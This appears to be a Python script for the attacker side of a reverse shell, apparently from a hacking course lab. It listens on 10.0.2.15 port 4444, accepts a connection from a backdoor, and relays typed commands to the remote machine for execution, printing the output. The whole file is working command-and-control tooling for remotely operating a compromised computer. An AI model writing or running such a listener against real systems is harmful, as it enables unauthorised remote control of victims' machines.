#!/usr/bin/env python

import socket, json

class Listener:

    def __init__(self, ip, port):
        '''Start listener server allowing to reuse sockets.'''
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #Change any option on your listener object
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port)) #THE PORT MUST NOT BE USED BY SYSTEM.
        listener.listen(0) #Backlog queue
        print("Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("Got a connection from " + str(address) + "!")

    def reliable_send(self, data):
        '''Instead of socket send method, convert data into JSON object.'''
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        '''Return the JSON object to a regular string.'''
        json_data = self.connection.recv(1024)
        return json.loads(json_data)

    def execute_remotely(self, command):
        '''Send command and receive output'''
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        '''Execute the program by adding a command.'''
        while True:
            command = input(">")
            # print(command)            #print(type(command))
            result = self.execute_remotely(command)
            print(result)


my_listener = Listener("10.0.2.15", 4444)
my_listener.run()